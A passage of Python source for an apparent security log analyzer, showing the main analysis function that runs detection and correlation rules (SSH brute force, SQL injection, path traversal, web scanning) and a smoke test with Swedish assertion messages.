    normalized = log_text.strip("\ufeff\n\r\t ")
    if not normalized:
        return []

    cfg = _get_config()
    events = _parse_events(normalized, cfg)

    if _env_debug_enabled():
        logger.info("[LogAnalyzerDebug] lines=%d sample=%r", len(events), events[0].raw[:200] if events else "")

    findings: List[Dict[str, Any]] = []

    # Baseline rules (also used by tests)
    findings.extend(_rule_failed_login_totals(events, cfg))
    findings.extend(_rule_ssh_auth_failures(events, cfg))
    findings.extend(_rule_sudo_commands(events, cfg))
    findings.extend(_rule_user_account_changes(events, cfg))
    findings.extend(_rule_suspicious_ip_lines(events, cfg))
    findings.extend(_rule_bruteforce_indicators(events, cfg))

    # Additional rules for broader coverage
    findings.extend(_rule_web_sensitive_paths(events, cfg))
    findings.extend(_rule_sqli_attempts(events, cfg))
    findings.extend(_rule_path_traversal_attempts(events, cfg))
    findings.extend(_rule_malware_downloads(events, cfg))
    findings.extend(_rule_cron_and_tasks(events, cfg))

    # Correlation rules
    findings.extend(_rule_correlate_ssh_bruteforce(events, cfg))
    findings.extend(_rule_correlate_password_spray(events, cfg))
    findings.extend(_rule_correlate_fail_then_success(events, cfg))
    findings.extend(_rule_correlate_web_scanning(events, cfg))
    findings.extend(_rule_correlate_web_401_403(events, cfg))

    findings = _dedupe_findings(findings)
    findings = _sort_findings(findings)

    return findings


def run_internal_smoke_test() -> None:
    """Internal sanity check that does not affect UI or routes."""
    findings = analyze_log_content(_SAMPLE_SUSPICIOUS_LOG)
    if not isinstance(findings, list):
        raise AssertionError("findings must be a list")
    if not any((f.get("severity") in {"high", "critical"}) for f in findings):
        raise AssertionError("smoke test förväntar minst ett high eller critical fynd")
    if len(findings) < 2:
        raise AssertionError("smoke test förväntar flera fynd")
